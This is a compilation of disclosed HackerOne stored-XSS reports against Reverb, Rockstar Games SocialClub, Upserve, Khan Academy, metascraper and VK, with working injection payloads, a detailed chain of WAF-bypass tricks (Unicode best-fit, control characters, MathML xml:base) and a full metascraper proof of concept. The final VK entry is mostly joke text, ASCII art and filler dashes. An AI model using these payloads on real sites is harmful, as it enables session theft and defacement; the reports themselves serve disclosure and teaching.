### [Persistent XSS in https://sandbox.reverb.com/item/](https://hackerone.com/reports/333008)

- **Report ID:** `333008`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Reverb.com
- **Reporter:** @bigshaq
- **Bounty:** - usd
- **Disclosed:** 2018-05-06T16:08:07.519Z
- **CVE(s):** -

**Vulnerability Information:**

# Description
I found a Persistent XSS in a listing page. The flaw is in the SoundCloud link that the listing owner can attach(The parameter is called *product[soundcloud_link_attributes][link]*). There's no encoding on the user input and it looks like there's only client-side validation.

# PoC
The payload:
```
https://soundcloud.com/rich-the-kid/sets/the-world-is-yours-15?fuzzing" onload=alert(document.domain) x="
```
If you try to put this payload straight into the "Edit Listing" page it'll give you the following error:
```
https://sandbox.reverb.com/listings/[YOUR_LISTING_ID]/edit
```
{F281627}

But it looks like there's only client side validation, when I tried to enter a valid link:
```
https://soundcloud.com/rich-the-kid/sets/the-world-is-yours-15
```
I got no error message(because it was a valid link)
But when I clicked "Save & Review Listing", intercepted the request and tampered the *product[soundcloud_link_attributes][link]* parameter's value to:
```
https://soundcloud.com/rich-the-kid/sets/the-world-is-yours-15?fuzzing" onload=alert(document.domain) x="
```
It updated successfully and because there's no encoding on this input parameter - it allowed me to inject javascript code that'll be stored on my listing page.
{F281640}

PoC Video: https://youtu.be/Y-8W422hLOw

## Impact

An attacker can:
* Perform a defacement on every possible store in the website (all he need is a single click from the victim)
* Deny future access from any other shop owner that access this listing(with the self-PXSS that i reported 2 days ago: https://hackerone.com/reports/331725 )
*  Perform operations in the application on behalf of the victim

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://sandbox.reverb.com/item/

**Verified**
Yes

---

### [Stored XSS in Snapmatic + R★Editor comments](https://hackerone.com/reports/309531)

- **Report ID:** `309531`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rockstar Games
- **Reporter:** @europa
- **Bounty:** - usd
- **Disclosed:** 2018-04-19T22:14:18.783Z
- **CVE(s):** -

**Summary (team):**

**Summary provided by the Researcher, @europa .**
___________________________________________________________________________________________________________________________
I requested the disclosure of what I hope is the final report regarding stored cross-site-scripting vulnerabilities on the Rockstar Games SocialClub, to also allow me to summarize the research that went into the other 5 reports. 
Have fun!

### Report #1
The 6-months adventure into researching and bypassing the SocialClub WAF begun with a simple discovery at first: while the WAF was removing anything enclosed in `<.*`, some **control characters** (`\b \f \n \r \t`) weren't being taken into account when injecting a `<`, allowing an adversary to create a malicious payload in the simple form of `<\t`.

A fix was deployed to **remove anything following a** `<`.

### Report #2
Two weeks after the fix, I ended up discovering what would soon become a “head-scratching” mystery: injecting a **single** `%` in the payload would bypass the filter entirely and force the back-end to somehow produce an unescaped `<` along with the escaped one.

The original payload was complex and confusing, and it led me to the wrong conclusion that [over-consumption flaws](https://hackerone.com/redirect?signature=e9fdfe4ae08f06fd697d9820b6472cbc3aceb3a2&url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23overconsumption) were to blame, but as analysis proceeded, it was finally discovered that the culprit was the **simple, single** `%`.

The final payload `<%&lt;script/src=//...?` produced an output of `&lt;%<script/src="//..." <="" p="">` from the back-end.

A fix was deployed and the WAF rules were made more strict, defeating all attempts with a 302 redirect to an error page.

### Report #3
Two months after the last fix, I discovered how the WAF wouldn't account for [Full-Width](https://hackerone.com/redirect?signature=94c9f9639fb2c55281d3c1e2820f40ecadc45807&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFF00) and [Small-Forms](https://hackerone.com/redirect?signature=e823898824394a9c0700e14806b23d9982e8d57a&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFE50) variants which, chained with the `%` confusion from the second report would again trick the back-end into producing a valid output: indeed, giving **`U+FF1C`** or **`U+FE64`** as the input would pass the WAF and the back-end would transform both into `<`. This is called a [best-fit match flaw](https://hackerone.com/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit) and it usually happens on Windows-powered technology stacks, where one of the processing layers fails to properly account for missing characters in destination codepages.

The payload `\uFE64%\uFF1Cscript/src=//...?`, evaded the WAF and produced `&lt;%<script/src="//...?" class="badLink"` in the HTML page.

A first fix was deployed preventing both script injections and DOM events manipulation, both of which I was able to bypass after a few days using a combination of **control chars, percentages, breaks, and exotic function invokation**. The payload `\uFF1C%\uFE64input/autofocus onfocus\b='[1].find(alert)'` successfully bypassed the new filters and popped an alert before the report was closed as resolved, allowing the team to look for a better solution in time. A second, stronger fix was deployed and the WAF rules were made even stricter prohibiting any combination of direct or indirect forms of `<` and `%` in suspicious contextes, plus any shape or form of `onXXX` DOM events.

### Report #4
The new WAF rules prevented any kind of injection: no useful HTML elements, no DOM events. Anything went straight to /dev/null. After spending a few weeks in trial & error tests, I remembered how the payload from **report #3** would have a `badLink class` added to it, as the back-end detected a suspicious URI in the comment and would ~~strike it out~~ and prevent it from becoming clickable.

After weeks of tests, in a few hours I was able to chain **_eight_ different techniques** to go through the WAF, the back-end filter, and the client-side Javascript filter:

1. using `<>` to separate “trigger words” in order to turn them “invisible” to the WAF (ie: `&<>lt;`). The _back-end_ would remove it for me.
2. using `\u0025` instead of `%` which would now trigger the WAF
3. using the unaccounted for `MATH` [MathML](https://hackerone.com/redirect?signature=f00315bb1ba003cb663832891ce2f04a5e1709e2&url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FMathML%2FElement%2Fmath) element
4. using control characters (`\n \t \b \r \f` from **report #1**) to break element names to trick the _back-end_ (not the WAF) into reassembling them in output (ie: `<m\bath` instead of `<math`)
5. using the `xml:base` attribute instead of the usual `href` to specify a Javascript URI
6. injecting quotes to mess up the output from the back-end
7. using an innocuos `href=#` to make everything following the payload clickable
8. using a **fake URL** enclosed in `[]` to exploit a flaw in the rendering engine in the back-end that would cause it to move the payload outside of the "badUrl" element and place it where we could use it

The final payload was `&<>lt;%&<>lt;m\bath xml:base=\"j<>avascript:alert(document.domain)//\" href=#\"[bad.url.pls]` which produced `&lt%<math xml:base="javascript:alert(document.domain)//" href="#" x="" class="badLink">[bad.url.pls]`

As a bonus note, this led to the discovery of a particular payload that would render a newsfeed comment **un-repliable and un-deletable**. Both flaws were fixed with better rules, and by preventing the back-end from stripping “*conveniently-placed*” tags and control characters.

### Report #5
Somewhat less-related to the SocialClub per sé, this was a variation on **report #3** where it was discovered that Snapmatic and R★ Editor comments would go a different validation flow than any other entry, and the [best-fit matchings](https://hackerone.com/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit) would once again act up but on a different codepage this time, when using **Left-Angle brackets** `U+3008 "〈"` from the [Cjk Symbols and Punctuation block](https://hackerone.com/redirect?signature=73b9a54dadbf0c72c2d6cba07cdf52f97d13da52&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B3000), and **Left-pointing Angle brackets** `U+2329 "〈"` from the [Miscellaneus Technical block](https://hackerone.com/redirect?signature=12de40484af21138b7e46413f2fa9bc6eaff769e&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B2300).

While the Snapmatic/R★ Editor back-end would block `U+FF1C` and `U+FE64`, the other two would go through and get "matched" to `<` somewhere in the web technology stack. My last payload was `〈script/src=//...?` and it was promptly fixed in both its variations.

### Conclusions
The Rockstar Games team is amazing. My first duplicate report was with them back in September and if it wasn't for @jmarshall reacting so politely to my unjustified noobish irk to a duplicate I would've probably dropped bug bounties altogether.

It's been great to be involved all these months into researching new things and approaches—failing for weeks at a time allowed me to learn new techniques and extremely peculiar quirks I now feel ready to share with the community. I still go back and try new ideas as of today, so far without success. Which is great.

Ad maiora!

**Summary (researcher):**

I requested the disclosure of what I hope is the final report regarding stored cross-site-scripting vulnerabilities on the Rockstar Games SocialClub, to also allow me to summarize the research that went into the other 5 reports. 
Have fun!

---

### Report #1
The 6-months adventure into researching and bypassing the SocialClub WAF begun with a simple discovery at first: while the WAF was removing anything enclosed in `<.*`, some **control characters** (`\b \f \n \r \t`) weren't being taken into account when injecting a `<`, allowing an adversary to create a malicious payload in the simple form of `<\t`.

A fix was deployed to **remove anything following a `<`**.

### Report #2
Two weeks after the fix, I ended up discovering what would soon become a “head-scratching” mystery: injecting a **single `%`** in the payload would bypass the filter entirely and force the back-end to somehow produce an unescaped `<` along with the escaped one.  
The original payload was complex and confusing, and it led me to the wrong conclusion that [over-consumption flaws](https://websec.github.io/unicode-security-guide/character-transformations/#overconsumption) were to blame, but as analysis proceeded, it was finally discovered that the culprit was the **simple, single `%`**.

The final payload `<%&lt;script/src=//...?` produced an output of `&lt;%<script/src="//..." <="" p="">` from the back-end.

A fix was deployed and the WAF rules were made more strict, defeating all attempts with a 302 redirect to an error page.

### Report #3
Two months after the last fix, I discovered how the WAF wouldn't account for [**Full-Width**](https://www.compart.com/en/unicode/block/U+FF00) and [**Small-Forms**](https://www.compart.com/en/unicode/block/U+FE50) variants which, chained with the `%` confusion from the second report would again trick the back-end into producing a valid output: indeed, giving **`U+FF1C` or `U+FE64`** as the input would pass the WAF and the back-end would transform both into `<`. This is called a [best-fit match flaw](https://websec.github.io/unicode-security-guide/character-transformations/#best-fit) and it usually happens on Windows-powered technology stacks, where one of the processing layers fails to properly account for missing characters in destination codepages.

The payload `\uFE64%\uFF1Cscript/src=//...?`, evaded the WAF and produced `&lt;%<script/src="//...?" class="badLink"` in the HTML page.  

A first fix was deployed preventing both script injections and DOM events manipulation, both of which I was able to bypass after a few days using a combination of **control chars, percentages, breaks, and exotic function invokation**.  The payload `\uFF1C%\uFE64input/autofocus onfocus\b='[1].find(alert)'` successfully bypassed the new filters and popped an alert before the report was closed as resolved, allowing the team to look for a better solution in time. A second, stronger fix was deployed and the WAF rules were made even stricter prohibiting any combination of direct or indirect forms of `<` and `%` in suspicious contextes, plus any shape or form of `onXXX` DOM events.

### Report #4
The new WAF rules prevented *any* kind of injection: no useful HTML elements, no DOM events. Anything went straight to /dev/null. After spending a few weeks in trial & error tests, I remembered how the payload from **report #3** would have a `badLink` class added to it, as the back-end detected a suspicious URI in the comment and would ~~strike it out~~ and prevent it from becoming clickable.

After weeks of tests, in a few hours I was able to chain **_eight_ different techniques** to go through the WAF, the back-end filter, and the client-side Javascript filter:

1. using `<>` to separate “trigger words” in order to turn them “invisible” to the WAF (ie: `&<>lt;`). The _back-end_ would remove it for me.
2. using `\u0025` instead of `%` which would now trigger the WAF
3. using the unaccounted for `MATH` [MathML element](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math)
4. using control characters (`\n \t \b \r \f` from **report #1**) to break element names to trick the _back-end_ (not the WAF) into reassembling them in output (ie: `<m\bath` instead of `<math`)
5. using the `xml:base` attribute instead of the usual `href` to specify a Javascript URI
6. injecting quotes to mess up the output from the back-end
7. using an innocuos `href=#` to make everything following the payload clickable
8. using a **fake URL** enclosed in `[]` to exploit a flaw in the rendering engine in the back-end that would cause it to move the payload *outside* of the "badUrl" element and place it where we could use it 

The final payload was `&<>lt;%&<>lt;m\bath xml:base=\"j<>avascript:alert(document.domain)//\" href=#\"[bad.url.pls]` which produced `&lt%<math xml:base="javascript:alert(document.domain)//" href="#" x="" class="badLink">[bad.url.pls]`

As a bonus note, this led to the discovery of a particular payload that would render a newsfeed comment **un-repliable and un-deletable**. Both flaws were fixed with better rules, and by preventing the back-end from stripping *“conveniently-placed”* tags and control characters.

### Report #5
Somewhat *less-related* to the SocialClub per sé, this was a variation on **report #3** where it was discovered that Snapmatic and R★ Editor comments would go a different validation flow than any other entry, and the [best-fit matchings](https://websec.github.io/unicode-security-guide/character-transformations/#best-fit) would once again act up but on a different codepage this time, when using **Left-Angle brackets** `U+3008 "〈"` from the [Cjk Symbols and Punctuation block](https://www.compart.com/en/unicode/block/U+3000), and **Left-pointing Angle brackets** `U+2329 "〈"` from the [Miscellaneus Technical block](https://www.compart.com/en/unicode/block/U+2300).

While the Snapmatic/R★ Editor back-end would block `U+FF1C` and `U+FE64`, the other two would go through and get "matched" to `<` somewhere in the web technology stack. My last payload was `〈script/src=//...?` and it was promptly fixed in both its variations.

### Conclusions
The Rockstar Games team is amazing. My first duplicate report was with them back in September and if it wasn't for @jmarshall reacting so politely to my unjustified noobish irk to a duplicate I would've probably dropped bug bounties altogether.  
It's been great to be involved all these months into researching new things and approaches—failing for weeks at a time allowed me to learn new techniques and extremely peculiar quirks I now feel ready to share with the community. I still go back and try new ideas as of today, so far without success. Which is great.

Ad maiora!

---

### [Blind stored xss in demo form](https://hackerone.com/reports/324194)

- **Report ID:** `324194`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Upserve 
- **Reporter:** @paresh_parmar
- **Bounty:** 500 usd
- **Disclosed:** 2018-04-12T15:10:24.806Z
- **CVE(s):** -

**Summary (team):**

Through Upserve's demo request form, @paresh_parmar found a blind XSS in a 3rd party package for Upserve's CRM system. While the CRM system and 3rd party package are out of scope for our program, we decided to reward @paresh_parmar for his work in bringing this issue to our attention.

**Summary (researcher):**

- Endpoint where i added payload  `get a demo` form. 
- XSS executed in [redacted] company
-  In [redacted] company account , upserve  is using `3rd party tool` which is use for marketing stuff,
so vulnerable app was `3rd party` tool.  ( i also contact 3rd party, but no response from them) can't disclose name of tool because its use widely by many companies. 
- a report was closed as informative by the triage team. they said they couldn't reproduce issue and also it's 3rd party site so its ___out of scope___
- I contact [redacted] company.  that company contact upserve and told them about issue, and finally they reopen this report ,and fixed it . (3rd party tool released fix )

---

### [XSS through document projects](https://hackerone.com/reports/244902)

- **Report ID:** `244902`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Khan Academy
- **Reporter:** @ethanluismcdonough
- **Bounty:** - usd
- **Disclosed:** 2018-03-30T22:55:10.407Z
- **CVE(s):** -

**Vulnerability Information:**

Hello, I'm Ethan Luis McDonough ([@elmt2](https://www.khanacademy.org/profile/elmt2/) on Khan Academy), and I found a way to inject scripts into document projects.  Since KA document projects output HTML, I can edit the PUT request that updates projects (https://www.khanacademy.org/api/internal/scratchpads/ID) and inject JavaScript code inside an `<img>` tag's `onload` attribute.  Here's a demo that completely redirects a learner from KA to another site: https://www.khanacademy.org/physics/woah/4740384569491456.  

**Note**: the stored script does not run in Firefox because document projects don't seem to be working on that browser (at least on my machine).

---

### [[metascraper] Stored XSS in Open Graph meta properties read by metascrapper](https://hackerone.com/reports/309367)

- **Report ID:** `309367`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-03-28T06:09:21.146Z
- **CVE(s):** CVE-2018-3773

**Vulnerability Information:**

Hi Guys,

**metascrapper** is vulnerable to Stored XSS via Open Graph metadata, if they are used in HTML without any sanitization.

**Module:** 

A library to easily scrape metadata from an article on the web using Open Graph metadata, regular HTML metadata, and series of fallbacks.

https://www.npmjs.com/package/metascraper


**Description**

Due to lack of HTML sanitization, there is possibility to embed malicious code in any of metadata read by ```metascrapper```. When library reads such metadata, there is no sanitization performed. If output from ```metascrapper``` is used directly in HTML code, any HTML embed in metadata is executed in context of the page which load and render it.


## Steps To Reproduce:

### This part of PoC represents An Attacker

An attacker needs to inject malicious code into any of Open Graph property.

- create website (I serve it via static server available at http://127.0.0.1:8080) witt the following content. Please take a look at payload embed in ```og:site_name``` meta property:

```html
<!doctype html>
<html xmlns:og="http://ogp.me/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>metascraper</title>

    <meta property="og:description" content="The HR startups go to war.">
    <meta property="og:image" content="image">
    <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
    <meta property="og:title" content="test article">
    <meta property="og:type" content="article">
    <meta property="og:url" content="http://127.0.0.1:8080">
</head>

<body>
</body>
</html>
```

- save it as ```article.html``` in the root directory of the server runs on ```http://127.0.0.1:8080```.

- create ```malware.js``` file with following content and save it in the same directory as ```article.html```:

```
alert('Uh oh, I am very bad malware!')
```

Please be aware that ```JavaScript``` file with malicious code can be served from ANY place. This particular location is only for Poc.


**This represents an HTML page which can be "scrapped" with ```metascrapper```**


### This part of PoC represents legitimate User and an attack itself

- install ```metascrapper``` and required dependiences (```got``` and ```express```)

```
$ npm install metascrapper got express
```

- create an app which will use ```metascrapper``` to read webiste metadata. ```127.0.0.1:8888``` is address of server which uses ```metascrapper```. ```http://127.0.0.1:8080/article.html``` is **target website**, where from metadata will be read:

```javascript

const metascraper = require('metascraper')
const got = require('got')
const express = require('express')

const targetUrl = 'http://127.0.0.1:8080/article.html'

const app = express()

app.get('/scrap', function(req, res) {;
    (async() => {
        const {
            body: html,
            url
        } = await got(targetUrl)
        const metadata = await metascraper({
            html,
            url
        })
        console.log(metadata)  // see returned metadata in console:
        /*
            { author: null,
                date: null,
                description: 'The HR startups go to war.',
                image: 'http://127.0.0.1:8080/image',
                lang: 'en',
                logo: null,
                publisher: '<script src="http://127.0.0.1:8080/malware.js"></script>',
                title: 'test article',
                url: 'http://127.0.0.1:8080/article.html' }
        */
        // display content of metadata.publisher in the browser
        let __html = `
            <div>
                <p>site title: ${metadata.title}</p>
                <p>site publisher: ${metadata.publisher}</p>
            </div>
        `
        res.send(__html)
    })()
})

app.listen(8888, () => console.log('Example app listening on port 8888!'))
```

- run above app:

```
$ node app.js
```

- go to ```http://127.0.0.1:8888/scrap```

- malicious JavaScript code embed in site metadata ```og:site_name``` is executed:

{F257373}

As we can notice, our payload was displayed in the source page "as is":

{F257372}


## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

Although this is quite hard to exploit in the wild, there is no doubt such attack is possible. This might lead to malware distribution, session cookies from infected websites leaks, run cryptocurrency miners in users' browsers and many more attacks.

---

### [новенькое (старенькое upgreid) хакерство: делаем демократию во всем в контакте (XSS - на англиском)](https://hackerone.com/reports/316946)

- **Report ID:** `316946`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @yango
- **Bounty:** - usd
- **Disclosed:** 2018-03-04T13:00:13.213Z
- **CVE(s):** -

**Summary (team):**

XSS в Wiki.

**Summary (researcher):**

ето жесткое хакерство позволяло устроить массовую глючность в social set’ V Kontakte и зделать репост от имени любого челика открывшего сылку (особено страшно в росии где сажают за репосты) в контакти все оперативно исправили (3 месяца) у них реяльно золотые руки к сожелению глючность попала в руки очень плохих злых хакеров которые устроили незаконую агитацию кое какого персонажа (и испортили ему ужин - он чуть не подавился пельменями от ржаки) розроботчики сразу наказали злово хакера (бан страници) поетому в контакти была и остаеться самой безопасной social сетью регестрируйтесь [https://vk.com](https://facebook.com)
моя страница социал сети в контакте (my page social set) - пишите https://vk.com/bagosi раскажу про глючности и скину статьи по злому (hack) безплатно (fried)
------
---
---
---
Какойто череп из символов незнаю зачем он тут просто понравился
↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
[███████████████████████████ 
███████▀▀▀░░░░░░░▀▀▀███████ 
████▀░░░░░░░░░░░░░░░░░▀████ 
███│░░░░░░░░░░░░░░░░░░░│███ 
██▌│░░░░░░░░░░░░░░░░░░░│▐██ 
██░└┐░░░░░░░░░░░░░░░░░┌┘░██ 
██░░└┐░░░░░░░░░░░░░░░┌┘░░██ 
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██ 
██▌░│██████▌░░░▐██████│░▐██ 
███░│▐███▀▀░░▄░░▀▀███▌│░███ 
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██ 
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██ 
████▄─┘██▌░░░░░░░▐██└─▄████ 
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████ 
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████ 
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████ 
███████▄░░░░░░░░░░░▄███████ 
██████████▄▄▄▄▄▄▄██████████ 
███████████████████████████](https://vk.com/bagosi)
↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
А теперь многа палочек чтоб вы долго листали.........................
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
